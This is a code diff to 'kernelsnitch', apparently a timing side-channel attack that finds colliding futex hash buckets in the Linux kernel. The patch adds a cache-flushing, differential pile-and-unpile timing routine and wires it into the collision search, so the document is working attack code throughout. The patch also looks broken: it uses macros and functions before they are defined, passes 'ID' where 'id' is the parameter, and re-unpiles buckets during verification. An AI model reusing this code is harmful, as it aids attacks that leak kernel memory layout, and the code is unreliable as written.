@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <stdint.h>
 #include <assert.h>
+#include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <pthread.h>
@@ -164,9 +165,63 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
     WAIT();
 }
 
+static size_t __measure_diff(struct kernelsnitch_shared_state *ks, size_t id,
+                              size_t futex_addr)
+{
+    /* v9 differential: same measurement core as __measure (flush+cntvct)
+       taken twice - with the bucket piled and after unpiling. */
+    size_t t_piled = 0, t_empty = 0;
+    size_t __times[REPEAT_MEASUREMENT];
+    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
+        sched_yield();
+        memset((char *)__ks_flush_buf, 1, sizeof(__ks_flush_buf));
+        for (volatile size_t *p = (volatile size_t *)__ks_flush_buf;
+             p < (volatile size_t *)(__ks_flush_buf + sizeof(__ks_flush_buf));
+             p += 64 / sizeof(size_t))
+            (void)*p;
+        size_t t0 = now_ns();
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        size_t t1 = now_ns();
+        __times[l] = t1 - t0;
+    }
+    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
+    for (size_t l = 0; l < AVERAGE; ++l)
+        t_piled += __times[l];
+    t_piled /= AVERAGE;
+
+    __decrease(ks, id);
+
+    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
+        sched_yield();
+        memset((char *)__ks_flush_buf, 1, sizeof(__ks_flush_buf));
+        for (volatile size_t *p = (volatile size_t *)__ks_flush_buf;
+             p < (volatile size_t *)(__ks_flush_buf + sizeof(__ks_flush_buf));
+             p += 64 / sizeof(size_t))
+            (void)*p;
+        size_t t0 = now_ns();
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        size_t t1 = now_ns();
+        __times[l] = t1 - t0;
+    }
+    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
+    for (size_t l = 0; l < AVERAGE; ++l)
+        t_empty += __times[l];
+    t_empty /= AVERAGE;
+    return t_piled > 3 * t_empty;
+}
+
 /**
  * Simple compare
  */
+static void __decrease(struct kernelsnitch_shared_state *ks, size_t id)
+{
+    /* v9: unpile - wake every waiter thread on the piled futex. The threads
+       then exit (__do_increase returns), emptying the bucket chain. */
+    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE,
+                   INT_MAX, NULL, NULL, 0));
+    usleep(20000); /* let the woken threads actually exit */
+}
+
 #define REPEAT_MEASUREMENT 128
 #define AVERAGE (1<<3)
 static int __compare(const void *a, const void *b)
@@ -403,8 +458,10 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
-        ks->times[i] = __measure(futex_addr);
-        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+        /* v9: differential capture (pile/unpile). With fixed timing this
+           cleanly separates real same-bucket addrs from static noise. */
+        ks->times[i] = __measure_diff(ks, ID, futex_addr);
+        if (ks->times[i]) {
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx", futex_addr);
@@ -415,8 +472,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     if (count > 0) {
         size_t kept = 1;
         for (size_t i = 1; i <= count; ++i) {
-            size_t t2 = __measure(ks->futex_addrs[i]);
-            if (t2 > (approx_time * KERNELSNITCH_THRESHOLD_MULT))
+            size_t t2 = __measure_diff(ks, ID, ks->futex_addrs[i]);
+            if (t2)
                 ks->futex_addrs[kept++] = ks->futex_addrs[i];
         }
         count = kept - 1;
